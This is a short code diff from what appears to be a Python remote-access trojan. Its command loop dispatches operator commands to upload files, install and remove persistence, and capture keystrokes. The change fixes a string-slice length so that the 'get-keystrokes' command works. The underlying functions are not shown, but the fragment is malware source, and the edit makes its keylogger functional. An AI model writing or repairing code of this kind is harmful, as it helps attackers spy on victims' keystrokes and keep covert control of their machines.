@@ -155,7 +155,7 @@ while(True):
             returnval = ufile(params[1],params[0]) 
           elif cmd[:19] == "install-persistence":  
             returnval = persist() 
-          elif cmd[:12] == "get-keystrokes":  
+          elif cmd[:14] == "get-keystrokes":  
             returnval = keylog()
           elif cmd[:18] == "remove-persistence":  
             returnval = remove_persist() 
